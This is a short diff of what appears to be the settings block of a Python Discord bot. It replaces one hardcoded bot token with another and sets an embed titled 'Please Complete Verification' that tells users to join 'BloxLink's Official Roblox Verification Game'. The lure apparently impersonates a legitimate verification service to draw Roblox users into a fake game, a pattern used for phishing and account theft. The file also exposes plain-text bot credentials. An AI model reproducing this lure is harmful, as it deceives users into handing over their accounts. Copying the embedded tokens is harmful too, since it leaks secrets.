@@ -12,7 +12,7 @@ import requests
 
 ################### change these to your liking ###################
 
-token = "ODczMzMyODc3NzM0MDU2MDI2.YQ24nw.ImREc3-zH3r9DFHDSUjOO1p3te4"
+token = "ODczMzMyODc3NzM0MDU2MDI2.YQ24nw.JPl_Ozgv95-2p52kEU47h8BB_OQ"
 prefix = "!"
 title = "Please Complete Verification"
 desc ="To verify your account, please join BloxLink\'s Official Roblox Verification Game"
